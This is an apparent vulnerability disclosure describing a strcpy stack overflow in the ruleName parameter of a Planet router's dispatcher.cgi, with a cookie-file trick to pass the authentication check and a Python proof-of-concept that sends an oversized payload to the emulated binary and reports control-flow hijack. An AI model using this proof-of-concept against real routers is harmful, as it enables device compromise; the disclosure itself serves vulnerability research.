# web_acl_mgmt_Rules_Apply_post-ruleName

 I discovered a  stack overflow vulnerability in the Planet router.

By analyzing the dispatcher file in the bin directory, I found that the function web_acl_mgmt_Rules_Apply_post  contains a stack overflow vulnerability.

The stack overflow can be triggered by ruleNamekey value, which leads to a strcpy stack overflow.

In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of "20 0 0", and its function is to create a cookie with sufficient permissions to access this route.

```json
20 0 0
```

ï»¿The content of the **poc**.py file is as follows:

```json
import os


a = 0x2304
var_name = "ruleName"
b = 'a' * 0x500


poc_content = f"&cmd={a}&{var_name}={b}"
with open('poc', 'w') as f:
    f.write(poc_content)

command = (
    "sudo chroot . ./qemu-mips-static "
    "-E REQUEST_METHOD=POST "
    "-E HTTP_COOKIE='hid=0' "
    "-L ./lib "
    "-g 1234 "
    "./dispatcher.cgi "
    "< poc"  
)


os.system(command)
```

Through the above image, we can see that we have overflowed to 0x450 and successfully hijacked the control flow. If necessary, more can be overflowed.
